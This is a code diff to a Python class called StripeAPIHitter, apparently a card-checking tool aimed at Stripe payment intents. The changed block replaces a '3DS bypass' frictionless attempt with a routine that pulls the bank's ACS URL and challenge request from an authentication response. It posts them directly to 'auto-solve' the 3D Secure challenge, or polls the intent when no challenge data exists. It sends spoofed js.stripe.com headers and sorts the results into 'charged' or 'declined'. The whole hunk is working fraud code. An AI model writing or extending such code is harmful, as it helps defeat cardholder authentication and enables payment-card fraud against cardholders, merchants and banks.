@@ -1560,20 +1560,48 @@ class StripeAPIHitter:
                                         if _HAS_3DS_BYPASS and source:
                                             try:
                                                 _ch_type = "setup_intent" if is_setup_intent else "payment_intent"
-                                                # Try 3DS2 frictionless with multiple browser variations first
-                                                _fr_result = await attempt_3ds2_frictionless(
-                                                    loop, _cffi_session, self.pk_live,
-                                                    client_secret, intent_id, _ch_type, source, sdk, headers
-                                                )
-                                                if _fr_result:
-                                                    _fs, _fm = _fr_result
-                                                    if _fs in ('charged', 'approved'):
+                                                _ch_headers = {
+                                                    "User-Agent": profile["user_agent"],
+                                                    "Content-Type": "application/x-www-form-urlencoded",
+                                                    "Origin": "https://js.stripe.com",
+                                                    "Referer": "https://js.stripe.com/",
+                                                    "Accept": "application/json",
+                                                }
+                                                # Extract ACS URL and creq from the friend's auth response
+                                                # auth_json is in scope from the friend's authenticate call above
+                                                _acs_url = ""
+                                                _creq = ""
+                                                if isinstance(auth_json, dict):
+                                                    _ares = auth_json.get("ares", {}) or {}
+                                                    _acs_url = _ares.get("acsURL", "") or auth_json.get("acsURL", "")
+                                                    _creq = auth_json.get("creq", "")
+                                                
+                                                _ch_result = None
+                                                if _acs_url and _creq:
+                                                    # ACS data available — post creq directly to bank
+                                                    print(f"DEBUG: Challenge auto-solve: ACS={_acs_url[:50]}, creq={len(_creq)} chars")
+                                                    _ch_result = await attempt_3ds2_challenge(
+                                                        loop, _cffi_session, self.pk_live,
+                                                        client_secret, intent_id, _ch_type,
+                                                        _acs_url, _creq, source, _ch_headers
+                                                    )
+                                                else:
+                                                    # No ACS data — try polling in case it auto-resolved
+                                                    print(f"DEBUG: No ACS data in auth_json, polling intent status...")
+                                                    _ch_result = await poll_intent_status(
+                                                        loop, _cffi_session, self.pk_live,
+                                                        client_secret, intent_id, _ch_type, _ch_headers
+                                                    )
+                                                
+                                                if _ch_result:
+                                                    _cs, _cm = _ch_result
+                                                    if _cs in ('charged', 'approved'):
                                                         result['success'] = True
-                                                        result['decline_code'] = _fm
+                                                        result['decline_code'] = _cm
                                                         return result
-                                                    elif _fs in ('declined', 'live_declined'):
-                                                        result['decline_code'] = _fm
-                                                        result['error'] = _fm
+                                                    elif _cs in ('declined', 'live_declined'):
+                                                        result['decline_code'] = _cm
+                                                        result['error'] = _cm
                                                         result['raw_response'] = confirm_json
                                                         return result
                                             except Exception as _ch_ex:
